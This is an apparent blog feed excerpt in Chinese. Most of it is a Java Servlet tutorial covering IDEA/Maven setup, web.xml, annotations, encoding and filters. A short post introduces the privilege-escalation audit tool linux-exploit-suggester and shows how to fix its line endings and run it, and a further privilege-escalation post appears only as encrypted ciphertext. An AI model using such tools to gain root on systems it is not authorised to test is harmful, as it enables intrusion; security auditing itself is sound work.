        <content type="html"><![CDATA[<p>开始卷java了，先写一下在IDEA部署Servlet的两种方法吧，一种导包，一种用maven，然后记录自己学习的过程吧。</p><h1 id="IDEA部署Servlet"><a href="#IDEA部署Servlet" class="headerlink" title="IDEA部署Servlet"></a>IDEA部署Servlet</h1><h2 id="导servlet-api-jar包部署"><a href="#导servlet-api-jar包部署" class="headerlink" title="导servlet-api.jar包部署"></a>导<code>servlet-api.jar</code>包部署</h2><h3 id="新建java项目"><a href="#新建java项目" class="headerlink" title="新建java项目"></a>新建java项目</h3><p>添加框架支持：</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223153750446.png" alt="image-20211223153750446"></p><h3 id="添加web框架"><a href="#添加web框架" class="headerlink" title="添加web框架"></a>添加web框架</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223154035652.png" alt="image-20211223154035652"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223154201963.png" alt="image-20211223154201963"></p><h3 id="项目目录架构"><a href="#项目目录架构" class="headerlink" title="项目目录架构"></a>项目目录架构</h3><table><thead><tr><th>目录</th><th>描述</th></tr></thead><tbody><tr><td>.idea</td><td>IDEA工程配置文件</td></tr><tr><td>src</td><td>存放Java代码</td></tr><tr><td>web</td><td>存放项目资源</td></tr><tr><td>WEB-INF</td><td>存放项目配置文件，Jar包、class文件</td></tr><tr><td>WebProject.iml</td><td>模块配置文件</td></tr><tr><td>External Libraries</td><td>外部Jar文件</td></tr></tbody></table><h3 id="手工导入servlet-api-jar文件"><a href="#手工导入servlet-api-jar文件" class="headerlink" title="手工导入servlet-api.jar文件"></a>手工导入servlet-api.jar文件</h3><p>在<code>WEB-INF</code>文件夹下新建<code>lib</code>文件夹将<code>tomcat</code>中的<code>servlet-api.jar</code>复制进去</p><p>然后对文件进行项目集成，右键<code>lib</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223160110646.png" alt="image-20211223160110646"></p><h3 id="编写Servlet"><a href="#编写Servlet" class="headerlink" title="编写Servlet"></a>编写Servlet</h3><p>创建<code>MyServlet</code>，实现<code>Servlet</code>接口，重写5个方法</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223160459145.png" alt="image-20211223160459145"></p><h3 id="配置web-xml文件"><a href="#配置web-xml文件" class="headerlink" title="配置web.xml文件"></a>配置<code>web.xml</code>文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;3.1&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MyServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.dropann.servlet.MyServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MyServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/myservlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="集成tomcat"><a href="#集成tomcat" class="headerlink" title="集成tomcat"></a>集成tomcat</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223105023496.png" alt="image-20211223105023496"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223162321031.png" alt="image-20211223162321031"></p><h3 id="关联第三方jar包"><a href="#关联第三方jar包" class="headerlink" title="关联第三方jar包"></a>关联第三方jar包</h3><p>基本同手工导入<code>servlet-api.jar</code>文件</p><p>选择<code>Project Library</code>完成</p><p><code>Global Library</code> 表示所有工程都可以使用</p><p><code>Project Library</code>表示当前工程中所有的模块都可使用</p><p><code>Module Library</code>表示当前模块可以使用</p><h3 id="导出war包"><a href="#导出war包" class="headerlink" title="导出war包"></a>导出war包</h3><p>war包可以直接放入Tomcat的<code>webapps</code>目录中，启动Tomcat后自动解压</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223163451480.png" alt="image-20211223163451480"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223163808890.png" alt="image-20211223163808890"></p><p>构建war包</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223164317420.png" alt="image-20211223164317420"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223164321773.png" alt="image-20211223164321773"></p><blockquote><p>在<code>out\artifacts</code>目录中，查看生产的war包</p></blockquote><h3 id="解决IDEA打印中文乱码"><a href="#解决IDEA打印中文乱码" class="headerlink" title="解决IDEA打印中文乱码"></a>解决IDEA打印中文乱码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Dfile.encoding=UTF-8</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211224230734905.png" alt="image-20211224230734905"></p><h2 id="maven部署"><a href="#maven部署" class="headerlink" title="maven部署"></a>maven部署</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220118110615975.png" alt="image-20220118110615975"></p><p>把maven项目的结构补充完整</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220118110907949.png" alt="image-20220118110907949"></p><p>如果这边没有将目标设为源文件夹，在这里设置。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220118114515343.png" alt="image-20220118114515343"></p><p>如果pom.xml不全的话</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后面都一样了。</p><h1 id="Servlet-核心接口和类"><a href="#Servlet-核心接口和类" class="headerlink" title="Servlet 核心接口和类"></a>Servlet 核心接口和类</h1><h2 id="Servlet接口"><a href="#Servlet接口" class="headerlink" title="Servlet接口"></a>Servlet接口</h2><p>所有Servlet都会直接间接与该接口发生联系，该接口包括以下5种方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">init(ServletConfig servletConfig)</span><br><span class="line"></span><br><span class="line"><span class="function">ServletConfig <span class="title">getServletConfig</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">getServletInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">destroy</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><blockquote><p><code>init()</code>Servlet实例化后，Servlet容器会调用<code>init()</code>方法来初始化该对象，在处理客户请求前完成初始化操作，如建立数据库连接等。</p></blockquote><h2 id="GenericServlet抽象类"><a href="#GenericServlet抽象类" class="headerlink" title="GenericServlet抽象类"></a>GenericServlet抽象类</h2><p>它提供生命周期<code>init</code>和<code>destroy</code>的简单实现，要编写Servlet只需要重写抽象<code>service</code></p><h2 id="HttpServlet类"><a href="#HttpServlet类" class="headerlink" title="HttpServlet类"></a>HttpServlet类</h2><p>该类继承<code>GenericServlet</code>的基础上进一步扩展。HttpServlet的子类必须重写一个方法，该方法通常是以下方法之一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">doGet</span><br><span class="line">doPost</span><br><span class="line">doPut</span><br><span class="line">doDelete</span><br></pre></td></tr></table></figure><h2 id="Web-xml配置"><a href="#Web-xml配置" class="headerlink" title="Web.xml配置"></a>Web.xml配置</h2><p>精确匹配  <code>/具体名称</code></p><p>后缀匹配 <code>*.xxx</code></p><p>通配符匹配1<code>/*</code>    包含服务器所有的资源</p><p>通配符匹配2<code>/</code>     包含服务器所有的资源，不包括jsp</p><h2 id="WebServlet注解常用属性"><a href="#WebServlet注解常用属性" class="headerlink" title="@WebServlet注解常用属性"></a>@WebServlet注解常用属性</h2><p><code>name</code>：Serlvet名字(可选)</p><p><code>value</code>：配置url路径，可配置多个</p><p><code>urlPatterns</code>：配置url路径，和value作用一样，不能同时使用</p><p><code>loadOnStartup</code>：配置Servlet的创建的时机，如果是<strong>0</strong>或<strong>正数</strong> 启动程序时创建，如果是<strong>负数</strong>，则访问时创建。数字越小优先级越高。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(value = &#123;&quot;/bs&quot;,&quot;/bss&quot;&#125;, loadOnStartup = 0)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BasicServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是get方法&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&#123;&quot;/test&quot;, &quot;/get&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;POST Method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;GET Method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220118114701997.png" alt="image-20220118114701997"></p><h1 id="Servlet应用"><a href="#Servlet应用" class="headerlink" title="Servlet应用"></a>Servlet应用</h1><p>在Servlet中用来处理客户端请求需要用<code>doGet</code>或<code>doPost</code>方法的request对象</p><p>解决<code>doPost</code>出现乱码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br></pre></td></tr></table></figure><p>解决响应出现乱码</p><p>同时设置服务端的编码格式和客户端响应的文件类型以及响应时的编码格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resp.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>在<code>getWriter()</code>前设置</p></blockquote><h2 id="Servlet生命周期"><a href="#Servlet生命周期" class="headerlink" title="Servlet生命周期"></a>Servlet生命周期</h2><p>1.<strong>实例化</strong>：由容器调用Servlet构造器创建具体的Servlet对象，只执行一次。</p><p>2.<strong>初始化</strong>：调用<code>init()</code>方法会被调用，只执行一次。</p><p>3.<strong>提供服务</strong>：调用服务器的<code>Servlet()</code>方法处理请求，会执行多次。</p><p>4.<strong>销毁</strong>：当容器停止或重新启动都会引起销毁Servlet对象并调用destroy方法，释放所有在<code>init()</code>中申请的资源，只执行一次。</p><h1 id="filter过滤器"><a href="#filter过滤器" class="headerlink" title="filter过滤器"></a>filter过滤器</h1><p>过滤器时处于客户端与服务器目标资源之间的一道过滤技术。</p><h2 id="过滤器作用："><a href="#过滤器作用：" class="headerlink" title="过滤器作用："></a>过滤器作用：</h2><p>客户端发送请求时，会先经过Filter在到达目标Servlet中；响应时，会根据执行流程再次反向执行Filter。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211226232239366.png" alt="image-20211226232239366"></p><h2 id="编写过滤器"><a href="#编写过滤器" class="headerlink" title="编写过滤器"></a>编写过滤器</h2><p>ServletAPI中提供了一个接口，开发人员编写一个Java类实现接口，这个类称之为过滤器。</p><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><ol><li>编写Java类实现Filter接口</li><li>在doFilter方法中编写拦截逻辑</li><li>设置拦截路径</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;--My--Filter&quot;</span>);</span><br><span class="line">        <span class="comment">//让请求继续</span></span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤器配置"><a href="#过滤器配置" class="headerlink" title="过滤器配置"></a>过滤器配置</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebFilter(value = &quot;/过滤目标资源&quot;)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权审计</title>
      <link href="/p/f775d65e.html"/>
      <url>/p/f775d65e.html</url>
      
        <content type="html"><![CDATA[<p>总结系统提权审计工具</p><h1 id="linux-exploit-suggester"><a href="#linux-exploit-suggester" class="headerlink" title="linux-exploit-suggester"></a>linux-exploit-suggester</h1><p><code>linux-exploit-suggester</code>是一个提权审计工具</p><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><h2 id="解决-bad-interpreter报错"><a href="#解决-bad-interpreter报错" class="headerlink" title="解决: bad interpreter报错"></a>解决: bad interpreter报错</h2><p>报错原因：脚本从windows到linux有点水土不服，必须将脚本格式由dos改为unix才能解决问题。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211211173859852.png" alt="image-20211211173859852"></p><p><code>vim</code>看到脚本是dos格式，<code>:set ff</code>也可以查看脚本格式</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211211175543869.png" alt="image-20211211175543869"></p><p>在命令模式设置<code>:set ff=unix</code>将格式修改为unix格式，再输入<code>:set ff</code>返回如下结果表示修改成功。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211211180006346.png" alt="image-20211211180006346"></p><h3 id="使用kali中dos2unix命令"><a href="#使用kali中dos2unix命令" class="headerlink" title="使用kali中dos2unix命令"></a>使用kali中<code>dos2unix</code>命令</h3><p><code>dos2unix</code>命令用来将DOS格式的文本文件转换成UNIX格式的（DOS/MAC to UNIX text file format converter）。DOS下的文本文件是以<code>\r\n</code>作为断行标志的，表示成十六进制就是<code>0D 0A</code>。而Unix下的文本文件是以<code>\n</code>作为断行标志的，表示成十六进制就是<code>0A</code>。DOS格式的文本文件在Linux底下，用较低版本的vi打开时行尾会显示<code>^M</code>，而且很多命令都无法很好的处理这种格式的文件，如果是个shell脚本，。而Unix格式的文本文件在Windows下用Notepad打开时会拼在一起显示。因此产生了两种格式文件相互转换的需求，对应的将UNIX格式文本文件转成成DOS格式的是unix2dos命令。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211211180408667.png" alt="image-20211211180408667"></p><p>添加权限&amp;执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x les.sh</span><br><span class="line">./les.sh</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211211182017833.png" alt="image-20211211182017833"></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux提权</title>
      <link href="/p/3e45f69d.html"/>
      <url>/p/3e45f69d.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="dae48b450b2ecc7052c68b5406765fda08b66e5c8f804f3751af3abbe0ed7736">c157c9744e0298d00173c08a9dbffe0ec94f198c43dd2b95a3c3b526c19ab9305b113806fc3a2d90d16eb321692cbebbfb8af6163de2bd95dda40baf034020440e0a9bbb035bff9622ada4c92eb8dc0cbe031348e7b3d4099e361fbecef8302fee32b82c5b2561991416f7e1034b372837b3533b0043dfac4a7508f06352a039c805ee9b621dbb5cdc3350bf964f2b0d9cafc35b19de33753e26c82663a0ff7b6e0dd8ae84791a2000fbc1dad36425ed9f4342bbe39c390576204aa3cc5764ff2c6ae962ab0bd08f58c6c43f8c826125d37fef7689c7a6b0488cd02acbcede82d2c329df1d3acd67d1e6a488d45418dd7c207f0a0e91969dc473769102b212f9583c1737b1548309f4130d2d839ffdcb47cd93960bd945606974ddaed5ccf1db6836d5baf3a970197f0391001c0f925d9a7692271213695b9d9a7b28f77e0a7d49150c694421e61aa41c3be4f3729bec73e49726bc88b6d1011bbab7d87c8a09361da2dbfe20eafda7146982800f25b56761ac2cf55a220b20709fc385c500cec150a486aaaf44fa0fac25b7caf468e32894d63ff864c036525a0a3d5b96d1db1a2d4122dd217606ceaf665f7d71782b244867674e1351ae16a161ebf047d27da2738fb6fd82e179e80fb46f103b263245e421d76d93df312d53b588d0ea911860154a7019ec9718af9ca03efaa47848330764266d344db0a6265b4967921003c6b1bbe4055d0f8b3d46a27853a34bf7e36b8cbfe5bbe401445be00b50f82bc46be8fe90fc0ab1a72cf7fa7ecbe1bcdadf6753699ed7df6ad1550380336c9262c48bec8990c109ec66200d04897ee4170d57c193b8cf3adef135dc3a84aa1975d6faedb351a9f53938fb6c039fbf975f2bfbbc17a4f9a6881c14cc30f519de7260c15084b468d9a68d5a734d322b3e832a4554814b98c2382e4a202f92c816aa5b58480f701407c593602bf2f6ad43d40b6950e28ace02b48feb6c3849b6dd3b350eb9f254920e181e4bd12c7f2e48ff01d37895c4d7e46dfc1ba28162c293a8d7ce64b1b1f42e3e9828b22407aa827e019b986b9b76d23f671e64d1176604c607afabd170985b300b512ca809e7e803b5d0416da255ad7e86736e3c43beee94b61af6a48bb9546d503c3661df81596d6aaf69623e5d9937d9b148756d53c69afaac5bcd28af4e5b2f3226ab476a6ca1391bad1869fb2d8790e291e1f09995ab84df5b29151a1daf6ebed66224cb69973cca9020ed3149cf5d65407904b19b3e63875a1184ed868a2eb6383baef4025bf84ab9f98c2dbfbf8f7c9068a8e71fe4dbcb51da0091617f14db2f47f96416138db3da2779c612e230b8cc365b9752683b9d4f515243098ef1f9e158be51e0d5ae51a0fa1c250d0eaf11d941222fa2224fb0b26ae24d38f918a0893d2fbe75d2d423507f25cab5097ff1dba47ddbb6c281ce22fef116c983796f45b7fae28650d10ce18159057c1ddecb2b411673bde08015c7292c563ab028a272199931f1b85fa183644149799b3b24b070cb5e1005e9009e2504381860d9da06b0a86eb863069c89fe1558d48308ed1157724bce9d4db422508a1a7ee2eddbcb66e6fc5a9101b558217bdfa2289f4d96c3b19f686b4347a6142630e2048c8f2b56b14c64f8d74bc927262958b9c2c2357886ac9dc3414d6d16367d4bb0e078c247b6c3a4d1b586de2ba2981e4e92093f97132df9ecc176154732a99fca9daad1fbf0a540c3e7adf0a99002deec84efd42132d74dc1c740c89c63958eb70e1f9f98501299a1d56a7912ea3e0d8c01f7ee9650fe732d3c9ed81e628e981ec0026ca50dce13e4bf1a516721db1e04b3c094e96bc1a141e34e89555d9ea381e01514b9ae69c8d3677b3352f41559bf2f4e176e5e2c409b33ffb1a4f9ca0944033da1f257641939cfe2aa5b5288f3e88bee2eb530be77678d9534c820c072f58e2b04e2046c83d59d5fb2052f93ef9b52893c82b4f7ddaafaabbe9944cde0ba2bd568232be20b05473caf2e296dc77009d98d9b19598c94685aa82d763b34c96862766cada2b11a4f7d5f64df433775a96b3b6ba4c52b466cc3f52cbbcf4d2be6f07510e19b5a2c40673d6a77ccc8c45a85712485b3d30bdf996a89444be9d3a46d5b8291b077a7a1e47c99b8d192339bd02a56d48d81014b8484b29fd0e72c17270b91d7e0c34ca36b46378384feaee50bec8b6f3eebcab6bceb49702e30394a4af4e081d8578ee94df37401f536746ee30349b69762c38b3b614f30ae9b8c17381b13b7dfaa1ff0dc6eee9246d54c1ece7070393be177d4806d684093326b2fd5c945c68562a36dc0c1bf6ce67fd9ea641d28dadd54da649d9b4c91e1754dfad5738646e5a2ea2ea38625d8c3024aded65065bdb180f69f294edf66f8305910c8cdd03b1c04715a9ab09bfb9fc1f5a56a565771823489335f0552a89f0484c63c5dd44239f5633749b9e639bc5531dbd098d8a448fc7514e682cebfec9ac811a42cfbe58f8e07d4f55d39b32369f47fd53745faae6db4689e99c6f35f59c65c4e286645bf3404832115b4550d6656befbc914e1df8cb8e9752a8c0a5790ceefd9e115011b1aea458308d8ebb39a8069743493911bd6fcb524f6f0ff924f7770ddfd48c104ae313cd72a283519a38941e914f7996ab748ed65ed921451c55f610d2dc51b5eada69a867d37a0ff425c816b08e87213a7172cf0231d7077d030c3c1d096ce84f45dfec25f66793d734a2196954711e7aa729c449b1f8f75df7a021b5bc42dbe23fa06a9f5e7a0b32c40c6671274abd9e10454a8c2824296fe7660f16b66f3e4cfde7a53fb7fd3c5a2dc33ffab58d1f30059895ef078b49ff802ae7d64d04a7f74e2ef9ef967834206137547aabafe3c9885d2523c2deb5fe904ff47c2861bb2e2600407d5714a09accfb8de2794b33f25c9b9fe04f567e942a9da6a14e85ac1e815b96dbbab5d37cb0ede27f397b0271afecf754c3812f3b3edb8bdcfbe9bc0fa8a97ec0de4f617eae16032af1e2dc3e604456bad0e5bc5fb4d0227fedbdec90887eba9f9119d0916304569279d7c524efe20eefcd1304c5c63bdaf530a103fe1e52ed66a53e3a10380d16d4a1002b43bec900f970cab092e979d58f8dc4c83afdc9658590741839a8ccb605254ca81f46dc82c67ccf9b6af53faa4946d3cde35722563c547ae06517451c2c876ebf250ac4d96a5e89157215033622e1ed110d59c2e9c9fb7a0e3a6654e9fce3f7e2f1c5e2f9924072aa0753b25db3f615f003a9f39d5f208fe81009e8b350074a8e72fc1ed8efe39e28be893e2bb68bc209b938686fc4c3f5cfeca297d4c9294baf164cc98202068309c2db3fd55e9aa4cf7d4e18003c46f9134869b6bc31726fe3f2adc63c3694b7be56ef0651ac3dc0297898cd29ca352771c3be875815a84f36de0c602341b80a154387103020575adfcffcccf4d210492e082c3824c081307eeeb2777835938c25d1d48d91edf41fc374b3aeb555430b20d9c943f358b1a68e7ac1453825738c401b5bb30e0c718c7b9d4493462dbf6d53e487467ead52754255152205e614a60281bcf8f2de382c3d42b38e16099ec4dd1d841a723944d8be032de3b4050c8663d087ca65adac15cdf9e7cdf53fec2c68b6700f4731e06f330024366f25e1f37ac3dfc0887a2c0df878b68f38c59dc8a7dac531a353af57f5b94224312a4c4427b53ea389e7e3277a608a0a1cd95799edb0d733fdab51a2b0bdbaefb830c77880e55dd3f6a8d93645e2db44abbb3d77bfe8e1a86a521415159d152a9d45d27719d34c2316164d804e001f2c374502b68c51e82c1aee3f46466c93dcc0b2c9b1eacda44690d7f75b7819933c9a6c01687a964c3699ae994816e56d691b7bc9aafea9275021a4e5f7343291dfac602fa61f4871d21a998109fc19ddd107c11fbf45ff00736c6f04bd5911369fe253446d319760e4f8f1045de34cb1ddb1b62585a7f78768c521475d21c1cdee435d7f7d0230fb60a60e14362fcbeb5315bfe